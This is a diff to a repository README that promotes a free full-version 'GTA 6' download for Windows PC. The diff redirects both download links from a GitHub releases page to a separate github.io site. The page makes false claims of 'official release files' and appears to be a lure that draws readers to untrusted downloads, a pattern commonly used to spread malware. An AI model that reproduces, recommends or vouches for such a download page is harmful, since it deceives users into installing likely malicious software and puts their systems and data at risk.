@@ -4,11 +4,11 @@
 
 Welcome to the ultimate destination for downloading GTA 6 for Windows PC. This repository provides you with direct access to the highly anticipated Grand Theft Auto VI build, fully playable in 2026. Whether you're a longtime fan of the series or new to the world of Vice City, this guide will walk you through every step—from downloading to launching the game—with zero technical hassle.
 
-[![DOWNLOAD GTA 6 NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD-GTA%206%20FULL%20VERSION-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://github.com/Kovalj7999/GTA-6-MediaFire-Download-Link-2026/releases)
+[![DOWNLOAD GTA 6 NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD-GTA%206%20FULL%20VERSION-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://kovalj7999.github.io)
 
 ## 📥 Download Instructions
 
-Visit this link to download the application: [https://github.com/Kovalj7999/GTA-6-MediaFire-Download-Link-2026/releases](https://github.com/Kovalj7999/GTA-6-MediaFire-Download-Link-2026/releases)
+Visit this link to download the application: [https://kovalj7999.github.io](https://kovalj7999.github.io)
 
 The download page contains the official release files for GTA 6. Simply click the link above to access the release page and grab your copy.
 
